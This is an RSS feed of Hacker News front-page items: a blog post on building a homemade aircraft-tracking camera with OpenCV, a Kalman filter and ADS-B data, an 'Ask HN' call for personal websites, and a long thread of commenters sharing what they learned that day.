<?xml version='1.0' encoding='UTF-8'?>
<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>Hacker News: Front Page</title><link>https://raw.githubusercontent.com/Prabesh01/hnrss-content-extract/refs/heads/main/out/rss.xml</link><description>Hacker News RSS</description><atom:link href="https://raw.githubusercontent.com/Prabesh01/hnrss-content-extract/refs/heads/main/out/rss.xml" rel="self"/><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><language>en</language><lastBuildDate>Thu, 15 Jan 2026 10:13:16 +0000</lastBuildDate><item><title>Project SkyWatch (a.k.a. Wescam at Home)</title><link>https://ianservin.com/2026/01/13/project-skywatch-aka-wescam-at-home/</link><description>&lt;doc fingerprint="b5bc1e5017e5c986"&gt;
  &lt;main&gt;
    &lt;p&gt;Professional aviation surveillance relies on a specific piece of hardware: the EO/IR (Electro-Optical/Infra-Red) gimbal. These are the gyro-stabilized turrets you see on the nose of police helicopters or military drones, capable of keeping a rock-solid lock on a target regardless of how the aircraft maneuvers.&lt;/p&gt;
    &lt;p&gt;I wanted to replicate this capability to help track aircraft from the ground—building a tool that allows a consumer camera to lock onto and follow a target with similar stability, but without the defense-contractor budget.&lt;/p&gt;
    &lt;head rend="h4"&gt;The Hardware Constraint&lt;/head&gt;
    &lt;p&gt;The core of this build is a generic PTZ (Pan-Tilt-Zoom) camera, the kind typically used for streaming church services or campus lectures.&lt;/p&gt;
    &lt;p&gt;While cost-effective, these cameras present a major engineering challenge for tracking any object, let alone aircraft. Their motors are designed for slow, dampened pans across a stage, not for tracking a jet moving at 300 knots. The mechanical and electronics latency is significant; if you simply tell the camera to “follow that plane,” by the time the motors react, the target has often moved out of the frame.&lt;/p&gt;
    &lt;p&gt;To make this hardware viable, the heavy lifting has to move from mechanics to mathematics.&lt;/p&gt;
    &lt;head rend="h4"&gt;The Software Stack&lt;/head&gt;
    &lt;p&gt;I built a custom control loop to bridge the gap between the camera’s sluggish motors and the dynamic speed of the targets. The stack fuses three main concepts to help the system maintain a visual lock:&lt;/p&gt;
    &lt;p&gt;Visual Processing (OpenCV &amp;amp; CSRT)&lt;lb/&gt;Once the camera is pointed at a target, the backend initializes a CSRT (Discriminative Correlation Filter with Channel and Spatial Reliability) tracker. Unlike simple contrast-based detection which can be easily fooled by clouds or changing lighting, CSRT tracks the specific visual features and texture of the aircraft. It calculates the error—how far off-center the target is in pixels—frame by frame to drive the control loop.&lt;/p&gt;
    &lt;p&gt;Prediction (Kalman Filter)&lt;lb/&gt;Raw visual data is noisy and processing introduces latency. To combat this, I implemented a Kalman Filter that models the aircraft’s state (position and velocity).&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Smoothing: It filters out sensor noise and jitter from the tracker.&lt;/item&gt;
      &lt;item&gt;Prediction: Crucially, it predicts where the aircraft will be roughly 200ms in the future (accounting for system latency).&lt;/item&gt;
      &lt;item&gt;Feed-Forward Control: Instead of just reacting to the error (Feedback), the system feeds the predicted velocity directly to the motors (Feed-Forward). This allows the camera to “lead” the target, eliminating the drag/lag typical of reactive PID loops.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Control (PID + Feed-Forward Loop)&lt;lb/&gt;The control logic combines a standard PID controller with the Kalman velocity vector.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Proportional: Corrects the immediate position error.&lt;/item&gt;
      &lt;item&gt;Integral: Corrects steady-state error (e.g., wind resistance or motor deadbands).&lt;/item&gt;
      &lt;item&gt;Derivative: Dampens the movement to prevent overshoot.&lt;/item&gt;
      &lt;item&gt;Dynamic Speed Limiting: I also implemented a dynamic velocity clamp that scales the motor aggressivity based on the distance to the target. This allows for high-speed slew when acquireing a target, but precision micro-stepping when the target is centered.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h4"&gt;The “Virtual” Gimbal&lt;/head&gt;
    &lt;p&gt;Even with a tuned PID loop, the plastic gears in a consumer PTZ camera have physical limitations. There is always some mechanical play that results in jitter at high zoom levels and the onboard control electronics (including their dampening/smoothing algorithms) introduce latency that prevent perfect mechanical stabilization.&lt;/p&gt;
    &lt;p&gt;To solve this, I implemented a digital stabilization layer—essentially a “virtual gimbal.” The software crops into the sensor slightly and shifts the image frame-by-frame to counteract the imperfect mechanical stabilization. The result is an incredibly stable image that mimics the expensive mechanical stabilization of professional EO/IR turrets.&lt;/p&gt;
    &lt;head rend="h4"&gt;Data Fusion&lt;/head&gt;
    &lt;p&gt;An optical lock is useful, but context is better. Since the system knows the camera’s precise azimuth and elevation, I can correlate the visual data with live ADS-B telemetry. When tracking a target, the system queries local ADS-B traffic to find an aircraft at those specific coordinates. This data comes from a local ADS-B receiver with a script monitoring tar1090.&lt;/p&gt;
    &lt;head rend="h4"&gt;Why Build This?&lt;/head&gt;
    &lt;p&gt;This project is an experiment in sousveillance—monitoring the monitors. It involves taking the technologies used for ISR (Intelligence, Surveillance, and Reconnaissance) and adapting them for civilian use. By understanding how these tracking systems work, we gain a better understanding of the airspace above us and the tools often used to watch it.&lt;/p&gt;
    &lt;p&gt;This project is available on Github under an MIT license.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46618503</guid><pubDate>Wed, 14 Jan 2026 16:54:40 +0000</pubDate></item><item><title>Ask HN: Share your personal website</title><link>https://news.ycombinator.com/item?id=46618714</link><description>&lt;doc fingerprint="a785b41f6be747ae"&gt;
  &lt;main&gt;
    &lt;div&gt;
      &lt;p&gt;Hello HN! I am putting together a community-maintained directory of personal websites at &amp;lt;https://hnpwd.github.io/&amp;gt;. More details about the project can be found in the README at &amp;lt;https://github.com/hnpwd/hnpwd.github.io#readme&amp;gt;.&lt;/p&gt;
      &lt;p&gt;As you can see, the directory currently has only a handful of entries. I need your help to grow it. If you have a personal website, I would be glad if you shared it here. If your website is hosted on a web space where you have full control over its design and content, and if it has been well received in past HN discussions, I might add it to the directory. Just drop a link in the comments. Please let me know if you do not want your website to be included in the directory.&lt;/p&gt;
      &lt;p&gt;Also, I intend this to be a community maintained resource, so if you would like to join the GitHub project as a maintainer, please let me know either here or via the IRC link in the README.&lt;/p&gt;
      &lt;p&gt;By the way, see also 'Ask HN: Could you share your personal blog here?' - https://news.ycombinator.com/item?id=36575081 - July 2023 - (1014 points, 1940 comments). In this post, the scope is not restricted to blogs though. Any personal website is welcome, whether it is a blog, digital garden, personal wiki or something else entirely.&lt;/p&gt;
      &lt;p&gt;UPDATE: It is going to take a while to go through all the submissions and add them. If you'd like to help with the process, please send a PR directly to this project: https://github.com/hnpwd/hnpwd.github.io&lt;/p&gt;
    &lt;/div&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46618714</guid><pubDate>Wed, 14 Jan 2026 17:07:42 +0000</pubDate></item><item><title>Ask HN: What did you find out or explore today?</title><link>https://news.ycombinator.com/item?id=46619464</link><description>&lt;doc fingerprint="341911174cb61eb7"&gt;
  &lt;main&gt;
    &lt;p&gt;I found out my crimson-bellied conure is laying an egg today! She's nesting in some towels now, chirping away while she works on laying it.&lt;/p&gt;
    &lt;p&gt;Having an egg is relatively hard on parrots. I've given her lots of food and warmth to prepare. She is comically hungry -- she's usually not such a big eater, but she's happy today to be scarfing down her apple slices, fruit pellets, and safflower seeds.&lt;/p&gt;
    &lt;p&gt;She usually sleeps at the bottom of her cage, beneath a towel I put down for her. It's already unusual for parrots! But tonight she has made quite a nest with her towel: It's folded in half like usual, but she has nuzzled her way between the fold, so she has the towel underneath and on top of her. It's super cute.&lt;/p&gt;
    &lt;p&gt;I'm treating her with delicacy but she is determined to be a wild child of a bird. She's still flying around during the day and moving around plenty. I don't think I would be so confident if I had an egg like that inside me.&lt;/p&gt;
    &lt;p&gt;She has a stone perch that she likes to nibble on when she's working on an egg. I've wondered if it is some innate need to nourish herself with calcium, or if it's stress relief :)&lt;/p&gt;
    &lt;p&gt;So that's my night. Sitting outside of the metaphorical delivery ward with a metaphorical cigar, making sure she lays this egg that isn't even fertile to begin with! Birds :)&lt;/p&gt;
    &lt;p&gt;It does strike me as cruel too, to be denied freedom like that.&lt;/p&gt;
    &lt;p&gt;It also seems like the sibling comments are misunderstanding your last sentence, it's not about the "you" in that sentence having self imposed limitations, it's you being literally imprisoned by an external source without any way to get out. So asking "why are you a prisoner inside" doesn't make any sense.&lt;/p&gt;
    &lt;p&gt;This was always a flawed quote because even before such a realization, people still did novel things (and literally flew to new places), much the same as birds. And the answer is still the same for birds and humans, the constraint of resources. If you have enough then by all means, fly.&lt;/p&gt;
    &lt;p&gt;We keep a rabbit indoors, free roaming in the house, now for 7 years, I expect he will do 10+&lt;/p&gt;
    &lt;p&gt;Would you prefer to live freely for 6 months or have a hopefully comfortable life for ten times more. Before anyone jumping to say “freedom!” why don’t you do it already? Why are you keeping your body prisoner indoors?&lt;/p&gt;
    &lt;p&gt;I got a handheld emulator console as a Christmas gift. Configuring shaders that emulate crt TVs, I realized I had no mental model of how those TVs worked at all.&lt;/p&gt;
    &lt;p&gt;I’m used to “pixels are three little lights combining rgb colors”, which doesn’t work here, so I went on a rabbit hole and let me tell you, analog TVs are extremely impressive tech.&lt;/p&gt;
    &lt;p&gt;Getting an electron beam to hit a glass, making the chemicals on it spark, covering it in a “reading motion” for hundreds of lines, and doing that 60 times a second! And the beam is oriented by just careful usage of magnets. It sounds super sci-fi for an already dead, 130 years old technology.&lt;/p&gt;
    &lt;p&gt;I also learned that my childhood was a lie. Turns out that the logic in consoles of the time was tied to the speed of the beam, which in turn used alternating current’s frequency as a clock. This means that since European current changes 50 times per second rather than 60, our games played in slowmo (about 0.8x). American sonic was so much faster! And the music was so much more upbeat!&lt;/p&gt;
    &lt;p&gt;I'm exploring adding a firewall to my home network to detect if apps are using my network as residential proxy.&lt;/p&gt;
    &lt;p&gt;My daughter likes to install random games on iOS that have been advertised to her on other apps, and I wonder if some of those work as residential proxy behind the scenes.&lt;/p&gt;
    &lt;p&gt;I have started exploring Seneca/stoicism again. Prompted partly by a recent submission here, partly by personal reasons. Instead of consuming other peoples interpretation of stoicism I decided to go as close to the source as feasible for me. I have read Letters from a stoic a number of times before and my copy is filled with highlights, but this time I think I will try to limit myself to one or two letters a day and then really think about them properly.&lt;/p&gt;
    &lt;p&gt;The first one really hit me hard and prompted me to write out my own thoughts (https://jesperreiche.com/seneca-letter-2/) whether I will keep doing that I am a little unsure. It feels on the border of how personal I want to be/share on my blog.&lt;/p&gt;
    &lt;p&gt;P.S. I can see the irony in writing about me going to the source instead of consuming other peoples interpretation and then sharing a link to my own interpretation :)&lt;/p&gt;
    &lt;p&gt;Good read thanks. I totally can relate to the choices problem. It's rather easy with physical books (or was, as we have little room left for even more books ;-0) but ebooks are "dangerous" too.&lt;/p&gt;
    &lt;p&gt;Regarding cameras, it's harder (and more expensive) to wrangle with gear acquisition syndrome (GAS) but after switching from Canon EOS to Fuji, because the Canon stuff was too heavy when hiking, I managed to restrain myself most of the time. Because the question always is whether my images would become better with different gear or with more trial and error.&lt;/p&gt;
    &lt;p&gt;I opted for trial and error and eagerly watch a selected number of YouTube channels who almost always show me that I should and can improve myself and not my gear.&lt;/p&gt;
    &lt;p&gt;My home office gets up to about 1500ppm of CO2 by the end of the workday, which explains a lot about why I often feel exhausted after the end of a long, uninterrupted session in there (especially when I’m on back to back zoom calls).&lt;/p&gt;
    &lt;p&gt;I now have several plants in there that are supposed to be especially good at sucking up CO2, and my sensor reports that the current level is slightly below atmospheric ambient CO2 levels.&lt;/p&gt;
    &lt;p&gt;Interesting. What hardware do you use to measure this?&lt;/p&gt;
    &lt;p&gt;I have a Netatmo home device that measures PPM and have been observing the trend lines throughout the day. At some points my flat gets up to about 1400, which the device says is bad, and sometimes it goes down as low as 500. I've noticed a pattern but can't quite connect that pattern to my activity or the surroundings. It starts going up around 4pm, which could be homewards-bound vehicles, but it seems to trend even on weekends when there is lower traffic. Maybe I start breathing differently at these times. I'm quite interested in getting to the bottom of it. Unfortunately I'm west facing so plant use is quite limited.&lt;/p&gt;
    &lt;p&gt;What is the atmospheric ambient CO2 level? Is that variable based on location?&lt;/p&gt;
    &lt;p&gt;I've learnt a few things:&lt;/p&gt;
    &lt;p&gt;- I had my sensor on my work desk which meant the CO2 pooled, and was increased dramatically by my breathing almost directly onto it. Moved the sensor at least 1.5m&lt;/p&gt;
    &lt;p&gt;- I had the sensor quite low down, where CO2 pools (being heavier), so moved the sensor to eye level&lt;/p&gt;
    &lt;p&gt;- CO2 seemed to increase when cooking (same room), so while cooking I open the windows and let the warmth flow out of the building&lt;/p&gt;
    &lt;p&gt;I went on a tour of a miso factory today and learned about how it's made!&lt;/p&gt;
    &lt;p&gt;What surprised me the most was that shiro (white) miso and aka (red) miso are both the same mix of soybeans, salt, and rice malt but fermented for different periods of time. As the miso ferments for longer, its color becomes darker while its flavor becomes milder and more complex. Beyond 3 years of fermentation, you get diminishing returns as its flavor becomes too acidic.&lt;/p&gt;
    &lt;p&gt;After the tour, we got to sample some of the naturally fermented 3 years old miso, and it was easily the best I've ever had. Most miso you can buy in a grocery store is created through forced fermentation over a few months, so if you ever get a chance to try naturally aged miso I would highly recommend!&lt;/p&gt;
    &lt;p&gt;Same as white, green, yellow, black, pu erh tea, and all of their different varieties within those categories, it's all the same leaves, just different processes.&lt;/p&gt;
    &lt;p&gt;Chosen to be independent of a mariners orientation.&lt;/p&gt;
    &lt;p&gt;Starboard - most sailors were right handed and the steering oar was placed on the right. Star = steer. Board = side of boat.&lt;/p&gt;
    &lt;p&gt;Port - as steering oars got bigger, boats tended to dock on the left hand side. This became to be known as “lardboard” which sounded too much like starboard, so it was changed to “Port” (as in the side typically facing the port side.&lt;/p&gt;
    &lt;p&gt;In Spanish, it's babor and estribor. My personal mnemonic (me and most people being right-handed) is that the estribo (the stirrup, but I always though it was the reins - TIL) in a horse go on the right hand and the boba hand (the clumsy hand) is the left one.&lt;/p&gt;
    &lt;p&gt;I had some eye strain and think it is because my eye muscles are overused. A doctor told me the muscles in the eye are flat, like tapes, and that I would not feel a muscle ache. I noticed the strain when I focus on different points quickly. I started to pay attention to how I move my eyes and realized I read a lot of text while scrolling, for example reading X posts on mobile while scanning the text at the same time.&lt;/p&gt;
    &lt;p&gt;Yesterday I was reminded of “Rapid Serial Visual Presentation” for speed reading, where the words are presented so you do not have to move your eyes. I am currently trying it out with a Chrome extension called SwiftRead. I set the text size so it fits into my fovea area. I used a fovea detector website I saw on HN a while ago: https://www.shadertoy.com/view/4dsXzM (make the pattern full screen, then you can see the size of your fovea).&lt;/p&gt;
    &lt;p&gt;I also learned that I can reduce some of the strain by moving my head more toward the things I am looking at on the screen.&lt;/p&gt;
    &lt;p&gt;I've learned that being truthful in your resume as a SWE doesn't work anymore. I've had nearly 0 response rate to my applications, even if I was nearly a perfect match. Dude that we fired a while ago for being abysmally bad and non-productive gets interviews, raises and just got into ycombinator backed company by making up 75% of his resume(which I saw). We need a reset, this is getting ridiculous.&lt;/p&gt;
    &lt;p&gt;Sounds like you could use some resume review help. And I'm not talking about bs AI linkedin level "resume review". I mean some review from someone who's been in the industry for a while. There's a way to contact me via my profile. If you can find that I'll try to help you out.&lt;/p&gt;
    &lt;p&gt;I've been exploring kefir. I'm looking at finding some live grains to boost the store bought variety here (10-20 varieties) up to 50-60 varieties or so, like the kefir in Eastern Europe / Russia. The store bought stuff in my country (UK) is more like a diluted, gimmicky thing. However, I believe the strains of bacteria they do include are some of the more influential ones. I think it would just be interesting to expand the scope a bit.&lt;/p&gt;
    &lt;p&gt;This came from reading about the gut microbiome, which was spun off from reading a book about Ultra Processed Foods (Ultra-Processed People). I've been trying to remove UPF foods from my daily consumption, trying to lower the ratio of them I eat (the average is supposedly 60% for adults in my country), since the academic link between UPF and dementia is quite strong now. It's quite shocking to see just how much of a typical supermarket/food store is UPF, and where many of the emulsifiers and preservatives come from.&lt;/p&gt;
    &lt;p&gt;I’m reading Domain Driven Development and learning why so many of my projects have been tough to maintain.&lt;/p&gt;
    &lt;p&gt;I also recently learned that you can get ancient coins for very little money if you don’t care about resale value or need them to be in pristine condition. I bought some coins from kingdoms that I’d never heard of. Many are thousands of years old! It’s fun holding a piece of history like that.&lt;/p&gt;
    &lt;p&gt;&amp;gt; I’m reading Domain Driven Development and learning why so many of my projects have been tough to maintain.&lt;/p&gt;
    &lt;p&gt;Oooh, thats a good one. Next read the Architects paradox, Why Greatness cannot be planned and Understanding Variation and your views of the world will be forever altered. Or pick up "Architecture Modernization" by Nick Tune if you want more tools to do stuff and if you do not want to achieve enligntenment.&lt;/p&gt;
    &lt;p&gt;_____&lt;/p&gt;
    &lt;p&gt;Where did you acquire cheap ancient coins? ebay? May be cool to get some for my dnd group&lt;/p&gt;
    &lt;p&gt;Ancient coin collecting is an awesome hobby! I have one that scholars think was made by / designed by Pythagoras himself. For a few hundred bucks!&lt;/p&gt;
    &lt;p&gt;Recently I learned that only 3% of Latin works from 1450-1700 (including renaissance and scientific revolution) have been translated. Secondrenaissance.ai&lt;/p&gt;
    &lt;p&gt;I’ve been slowing crunching through Math for Deep Learning, so spent a fair amount of time looking at Hessian matrices + second order optimisation. I’ve been slowly reading this book for a year, so stopping to do most of the math by hand each time. One chapter to go!&lt;/p&gt;
    &lt;p&gt;Then I was sick all last week, so ended up down a rabbit hole about the current card collecting bubble (right word?). Super interesting.&lt;/p&gt;
    &lt;p&gt;Surströmming, the Swedish can of fermented fish, is strongly recommended to be punctured while submerged in tap water. It is not pasteurized and is actively fermenting in storage, and the content will spray around if opened under atmospheric conditions.&lt;/p&gt;
    &lt;p&gt;When transported on cargo flights, they are double packed as cans in a barrel in a crate, and considered UN classified "miscellaneous dangerous goods" with identification number UN3334 "Aviation regulated liquid, n.o.s." with accompanying scary(albeit monochromatic) warning stickers, if at all accepted. When transported on ocean going vessels, they are often required to be in its own shipping container, again double packaged and correctly labeled.&lt;/p&gt;
    &lt;p&gt;Incorporated a cli AI to my daily work. Just impressive, was working on some networking code, I could think of 100 ways to stress test it, then I ‘prompted’? AI to implement those ideas, found many issues, hangs. Shared agent those, asked it to add prints, retest, improve my implementation. Now I got a good solution in a day. Previously this would take a week at least with my worrying about all the things I could test, improve…&lt;/p&gt;
    &lt;p&gt;Reading up on the history of information management, and the real killer app for paper was double-entry bookkeeping, which made Venice rich and contributed to starting the Renaissance.&lt;/p&gt;
    &lt;p&gt;I found out today that the location header of an HTTP redirect can be a tel:+ URI and phone's will actually ask you whether you want to call that number.&lt;/p&gt;
    &lt;p&gt;I found just now that my telecom operator - Airtel - randomly subscribed me for OTT services and charged me for it. But upon calling them and contesting, they just asked if I want to unsubscribe and then reverted the charges. No threats, pleading, or back-and-forth involved from either side. Mildly surreal.&lt;/p&gt;
    &lt;p&gt;I wonder that's a new corporate strategy - charge randomly till someone goes through the pain of IVR and spends 15 mins with support. Must generate quite an upside for them if it is indeed a strategy.&lt;/p&gt;
    &lt;p&gt;&amp;gt; Must generate quite an upside for them if it is indeed a strategy.&lt;/p&gt;
    &lt;p&gt;This is the same Airtel that auto opened payments bank accounts without customer consent or knowledge while getting a sim card. They even got cash deposited into those accounts from the govt direct benefit schemes while keeping their customers in the dark.&lt;/p&gt;
    &lt;p&gt;I'm sure its completely "accidental" and they'll have more of these glitches and mistakes in the future.&lt;/p&gt;
    &lt;p&gt;We've recently been without water in the UK for 5 days (water company failings). I've come to appreciate mains water and how its utility is hard felt by omission for toilets, washing &amp;amp; cleaning. Immensely grateful to have it back now.&lt;/p&gt;
    &lt;p&gt;I had a great euphoric epiphany feeling today. Doesn't come along too often, will celebrate with a nice glass of wine :)&lt;/p&gt;
    &lt;p&gt;Am doing data engineering for some big data (yeah, big enough) and thinking about efficiency of data enrichment. There's this classic trilemma with data enrichment where you can have good write efficiency, good read efficiency and/or good storage cost, pick two.&lt;/p&gt;
    &lt;p&gt;E.g. you have a 1TB table and you want to add a column that, say, will take 1GB to store.&lt;/p&gt;
    &lt;p&gt;You can create a new table that is 1.1TB and then delete the old table, but this is both write-inefficient and often breaks how normal data lake orchestration works.&lt;/p&gt;
    &lt;p&gt;You can create a new wide table that is 1.1TB and keep it along side the old table, but this is both write-inefficient and expensive to store.&lt;/p&gt;
    &lt;p&gt;You can create a narrow companion table that has just a join key and 1GB of data. This is efficient to write and store, but inefficient to query when you force all users to do joins on read.&lt;/p&gt;
    &lt;p&gt;And I've come up with a cunning forth way where you write a narrow table and read a wide table so its literally best of all worlds! Kinda staggering :) Still on a high.&lt;/p&gt;
    &lt;p&gt;Might actually be a conference paper, which is new territory for me. Lets see :)&lt;/p&gt;
    &lt;p&gt;Were your table is stored shouldn't matter that much if you have proper indezes which you need and if you change anything, your db is rebuilding the indezes anyway&lt;/p&gt;
    &lt;p&gt;specifically I've discovered how to 'trick' mainstream cloud storage and mainstream query engines using mainstream table formats how to read parallel arrays that are stored outside the table without using a classic join and treat them as new columns or schema evolution. It'll work on spark, bigquery etc.&lt;/p&gt;
    &lt;p&gt;Seriously, this is not what big data does today. Distributed query engines don't have the primitives to zip through two tables and treat them as column groups of the same wider logical table. There's a new kid on the block called LanceDB that has some of the same features but is aiming for different use-cases. My trick retrofits vertical partitioning into mainstream data lake stuff. It's generic and works on the tech stack my company uses but would also work on all the mainstream alternative stacks. Slightly slower on AWS. But anyway. I guess HN just wants to see an industrial track paper.&lt;/p&gt;
    &lt;p&gt;I'm building in robotics. Setting up a new 3d camera today. I found that the 10m active USB C cable that I bought transfers power in both directions, but only transfers data in one direction, it turns out to be some weird video USB variant. Next I needed to plug a gripper into a modbus controller. That uses an M8 8-pole 20cm cable. The controller manufacturer recently decided to switch from male to female connector, so now the cable needs to be male-male. After searching online for hours, I believe that is impossible to find as everyone only sells male-female cables.&lt;/p&gt;
    &lt;p&gt;I'm continuously surprised by how difficult it is to plug things together and how non-descriptive cable "standards" are about the actual capabilities of cables and connectors.&lt;/p&gt;
    &lt;p&gt;Talking to insurance agents I realised, they don't bother to read the policy documents and have a very superficial knowledge of the policies they are selling. You can glean lot more information feeding the docs to an LLM and asking questions.&lt;/p&gt;
    &lt;p&gt;Welp I'm going through my folder of notes on publishing type stuff - site generators, hosting providers, headless CMSs, all-in-one platforms, etc. First time seeing it all at the same time and being able to compare features/workflows etc.&lt;/p&gt;
    &lt;p&gt;Not strictly today. But I discovered that there exists a special class of algorithms that are designed with the use case of streaming data to your program. I just used one to get a uniformly distributed sample from a 10Gb log file.&lt;/p&gt;
    &lt;p&gt;I knew this was something coding interviews delved into: "if it doesn't fit in memory", but until like yesterday I never went down the rabbit hole. I have to say it was a nifty trick.&lt;/p&gt;
    &lt;p&gt;I’m learning about the “era of the nations” thinking from Hungary’s Balázs Orbán, via an episode of a podcast called the Winston Marshall show. YouTube just randomly suggested it to me.&lt;/p&gt;
    &lt;p&gt;I just rebuild a speed queen dryer that broke with spare parts from Amazon, which revealed a remarkably simplistic engineering. Very surprised by how simplistic the mechanism was. It’s incredible how over engineered most laundry systems have become.&lt;/p&gt;
    &lt;p&gt;Also spent some time digging into the integrations between Tesla FSD and rideshare services today. It’s remarkable how much progress has happened.&lt;/p&gt;
    &lt;p&gt;Be careful what you believe from Balázs Orbán, as a Hungarian I can say he is mostly concerned to come up with a ideology to explain whatever Viktor Orbán is doing and not building a consistent model of world politics that drives actions.&lt;/p&gt;
    &lt;p&gt;Indeed. I think that’s an astute assessment. I listen to a massive variety of perspectives, and as a NATO member I think what they have to say is worth hearing at least. Thanks for your comment — appreciate it.&lt;/p&gt;
    &lt;p&gt;I've been exploring the origins of the 'relational turn' in psychoanalysis that began after WWII and ramped up in the 1970s. Psychoanalysis got vastly more interesting after Freud and I had no idea!&lt;/p&gt;
    &lt;p&gt;When you use a microscope to magnify something, the objective (magnifying lens) is literally taking the Fourier transform of the image. The optical system recovers up to a limiting frequency, determining the spatial resolution of the image.&lt;/p&gt;
    &lt;p&gt;I'm looking into rennovating a massive agricultural machine shed ~ two stories high in the middle built some 80+ years ago using sections of spur pipeline as central upright poles to hold up some beefy jarrah trusses.&lt;/p&gt;
    &lt;p&gt;The "verandah" wings flaring out from there were bulit from flimsier timber that's rotting and the iron sheet walls are starting to peel away.&lt;/p&gt;
    &lt;p&gt;The posts are of interest as they have old markings and water fittings, tee pieces, etc.&lt;/p&gt;
    &lt;p&gt;It's not far from one of the original steam powered pumping stations that moved water through the main line.&lt;/p&gt;
    &lt;p&gt;I explored the programming language nim a bit deeper for use in game programming with SDL3 bindings, but I came to find out that compiled nim code on Windows often triggers anti-virus because, from what I hear from people, nim is used a lot in malware development currently. Which is a shame because I really like that language. I haven't tested it myself, it's just things I have heard and read. Someone on r/gamedev told me to write the code in nim, generate C code and then compile it with zig cc.&lt;/p&gt;
    &lt;p&gt;If anyone has any experience with this, please do chime in :)&lt;/p&gt;
    &lt;p&gt;I don't have any nim experience (sorry!) but I'm also exploring SDL3 with odin. I was able to get a naive battleship clone up and working very quickly, pretty neat. Next step is the new SDL3 GPU API.&lt;/p&gt;
    &lt;p&gt;I've been working on a litle raspberry pi pico project with kafka. As someone that used to have an Arduino uno, it made me genuinely shocked at how small controllers have gotten and they're massive capabilities&lt;/p&gt;
    &lt;p&gt;I learned that the large tree near where I live in London that has visibly grown in the last year is a Coast Redwood (a.k.a. California Redwood, a.k.a. Sequoia) and that there are half a million of them in the UK.&lt;/p&gt;
    &lt;p&gt;I found out that the adhesives I've encountered from time to time that remain tacky and easily moved or removed are called "non-hardening" adhesives. This was after using E8000 glue for a headphone repair today.&lt;/p&gt;
    &lt;p&gt;That the FOSS bazaar broke off into megachurches while still maintaining a healthy small scale and independent bazaar [0]. That FOSS sustainability is much more complicated than just "throw money at it".&lt;/p&gt;
    &lt;p&gt;That there's "metal paste" [1].&lt;/p&gt;
    &lt;p&gt;That the zodiac killer's messages have been cracked for five years now (I didn't know they were cracked to begin with) and that it was a shift and substitution cypher [2]. The telltale clue was that the symbol frequency was uniform but under shift it become non-uniform.&lt;/p&gt;
    &lt;p&gt;How to solder those pesky connectors that come on the tiny servo motors you can get from Aliexpress [3].&lt;/p&gt;
    &lt;p&gt;That Firefox only has 2.3% market share [4].&lt;/p&gt;
    &lt;p&gt;Multiscale 3d truchet patterns are freakin complicated [5].&lt;/p&gt;
    &lt;p&gt;That prioritizing tasks by the linear combination of priority and effort remains a good strategy.&lt;/p&gt;
    &lt;p&gt;• Z408 (July 1969): Solved in days by Donald &amp;amp; Bettye Harden.&lt;/p&gt;
    &lt;p&gt;Message (with misspellings): “I like killing people because it is so much fun it is more fun than killing wild game in the forrest because man is the most dangeroue anamal of all to kill something gives me the most thrilling experence it is even better than getting your rocks off with a girl the best part of it is thae when I die I will be reborn in paradice and all the I have killed will become my slaves I will not give you my name because you will try to sloi down or atop my collectiog of slaves for my afterlife ebeorietemethhpiti”&lt;/p&gt;
    &lt;p&gt;• Z340 (November 1969): Solved in 2020 (after 51 years) by David Oranchak, Jarl Van Eycke, and Sam Blake; FBI confirmed.&lt;/p&gt;
    &lt;p&gt;Message (with misspellings): “I hope you are having lots of fun in trying to catch me that wasn’t me on the TV show which bringo up a point about me I am not afraid of the gas chamber becaase it will send me to paradlce all the sooher because e now have enough slaves to worv for me where every one else has nothing when they reach paradice so they are afraid of death I am not afraid because i vnow that my new life is life will be an easy one in paradice death”&lt;/p&gt;
    &lt;p&gt;I was reminded of the US Constitution's 10th amendment and reading some of the history around it.&lt;/p&gt;
    &lt;p&gt;&amp;gt; The powers not delegated to the United States by the Constitution, nor prohibited by it to the States, are reserved to the States respectively, or to the people.&lt;/p&gt;
    &lt;p&gt;Very relevant to what's going on today with National Guard and ICE deployments.&lt;/p&gt;
    &lt;p&gt;Also related and worth a read, I think, is the Supreme Court case Youngstown Sheet &amp;amp; Tube Co. v. Sawyer, 343 U.S. 579 (1952). The content of the dispute is different, as it involves the President seizing private property, but it is (one of?) the seminal cases regarding the scope of presidential powers. Justice Jackson’s concurring opinion is, at least for now, considered the best articulation of when the President may take unilateral action.&lt;/p&gt;
    &lt;p&gt;That running and taking cold showers really do make me more focused! And that i will have to be the one that fixes my life and builds my future. Deep, i know&lt;/p&gt;
    &lt;p&gt;Recently procured an AirGradient air quality monitor and set up the build environment so I can customize its reporting capability and perhaps add some different sensors. Also didn't realize how much CO2 builds up during the night in my bedroom. Will have to mitigate this as I believe this contributes to my poor sleep habits.&lt;/p&gt;
    &lt;p&gt;Been working on sheet cutting optimization for https://measuretocut.com today and it sent me straight down the cutting‑stock / 2D bin‑packing rabbit hole. What started as “wouldn’t it be nice if the site could tell you how to cut your wood sheets optimally?” turned into reading about NP‑hard problems and flipping through old operations research papers like I was cramming for an exam.&lt;/p&gt;
    &lt;p&gt;The funny part is how far the mathematical version of the problem is from what measuretocut.com actually needs to output. In reality you have kerf, ugly offcuts, and the fact that nobody wants a cutting diagram that looks like a circuit board. We really have to take into consideration a 2nd optimization, it needs to be an output that a person in a shop can glance at and immediately understand.&lt;/p&gt;
    &lt;p&gt;I learned that my fav part of Apennines is famous for a lack of light pollution and thus is an astro-tourism target. Never paid attention to that aspect.&lt;/p&gt;
    &lt;p&gt;I also learned that on Aug 12th this year a total eclipse of the sun can be observed from certain parts of Spain.&lt;/p&gt;
    &lt;p&gt;I am in Mexico City and I learned quite a bit about Santa Muerte. Hard to know how much truth there is in what the locals tell me but supposedly people who live in such dire conditions they feel closer to death than to life pary to Our Lady of Holy Death for protection.&lt;/p&gt;
    &lt;p&gt;Wikipedia says it is the fastest growing religion in the world.&lt;/p&gt;
